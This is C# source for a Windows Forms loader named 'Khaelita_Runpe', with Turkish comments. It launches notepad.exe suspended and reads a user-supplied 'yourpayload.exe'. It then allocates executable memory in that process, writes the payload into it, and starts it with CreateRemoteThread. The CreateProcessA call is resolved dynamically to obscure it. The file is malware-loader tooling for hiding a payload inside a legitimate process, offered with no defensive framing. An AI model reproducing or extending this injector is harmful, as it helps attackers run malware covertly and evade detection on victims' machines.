using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using RunPE;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Khaelita_Runpe
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            string filePath = @"C:\Windows\System32\notepad.exe";
            byte[] payload = File.ReadAllBytes(@"yourpayload.exe");

            RunPE.Execute(filePath, payload);

        }
    }

    public static class RunPE
    {
        private delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
        bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, out ProcessInformation processInformation);

        private static readonly DelegateCreateProcessA CreateProcessA = LoadApi<DelegateCreateProcessA>("kernel32", "CreateProcessA");

        private static T LoadApi<T>(string name, string method)
        {
            return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(name), method), typeof(T));
        }

        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

        [DllImport("kernel32")]
        private static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [Flags]
        private enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VMOperation = 0x00000008,
            VMRead = 0x00000010,
            VMWrite = 0x00000020,
            DupHandle = 0x00000040,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            Synchronize = 0x00100000
        }

        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        private struct ProcessInformation
        {
            public IntPtr ProcessHandle;
            public IntPtr ThreadHandle;
            public uint ProcessId;
            public uint ThreadId;
        }

        private struct StartupInformation
        {
            public int Size;
            public string Reserved;
            public string Desktop;
            public string Title;
            public int X;
            public int Y;
            public int XSize;
            public int YSize;
            public int XCountChars;
            public int YCountChars;
            public int FillAttribute;
            public int Flags;
            public short ShowWindow;
            public short Reserved2;
            public byte Reserved3;
            public IntPtr StdInput;
            public IntPtr StdOutput;
            public IntPtr StdError;
        }

        private enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        private enum MemoryProtection : uint
        {
            NoAccess = 0x1,
            ReadOnly = 0x2,
            ReadWrite = 0x4,
            WriteCopy = 0x8,
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [Flags]
        private enum ThreadAccess : uint
        {
            Terminate = 0x0001,
            SuspendResume = 0x0002,
            GetContext = 0x0008,
            SetContext = 0x0010,
            SetInformation = 0x0020,
            QueryInformation = 0x0040,
            SetThreadToken = 0x0080,
            Impersonate = 0x0100,
            DirectImpersonation = 0x0200,
            All = 0x1F03FF
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // Düzenlenmiş: ThreadStartRoutine delegesi eklendi.
        private delegate uint ThreadStartRoutine(IntPtr lpParameter);




        public static void Execute(string path, byte[] payload)
        {
            ProcessInformation pi = new ProcessInformation();
            StartupInformation si = new StartupInformation();
            si.Size = Marshal.SizeOf(typeof(StartupInformation));

            try
            {
                if (!CreateProcessA(path, null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi))
                {
                    int error = Marshal.GetLastWin32Error();
                    MessageBox.Show($"CreateProcessA başarısız oldu. Hata Kodu: {error}. Açıklama: {new Win32Exception(error).Message}");
                    throw new Exception("CreateProcessA başarısız oldu.");
                }

                IntPtr processHandle = OpenProcess(ProcessAccessFlags.All, false, (int)pi.ProcessId);
                if (processHandle == IntPtr.Zero)
                    throw new Exception("Süreç açılamadı.");

                IntPtr allocatedMemory = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)payload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
                if (allocatedMemory == IntPtr.Zero)
                    throw new Exception("Uzak süreçte bellek ayırmada başarısız oldu.");

                if (!WriteProcessMemory(processHandle, allocatedMemory, payload, (uint)payload.Length, out _))
                    throw new Exception("Payload'u uzak süreçe yazma başarısız oldu.");

                // Thread başlatma işlemi
                IntPtr threadHandle = CreateRemoteThread(processHandle, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);
                if (threadHandle == IntPtr.Zero)
                {
                    int error = Marshal.GetLastWin32Error();
                    MessageBox.Show($"Thread başlatma başarısız oldu. Hata Kodu: {error}. Açıklama: {new Win32Exception(error).Message}");
                }
            }

            catch (Exception ex)
            {
                MessageBox.Show("Hata: " + ex.Message);
            }
        }
    }





}
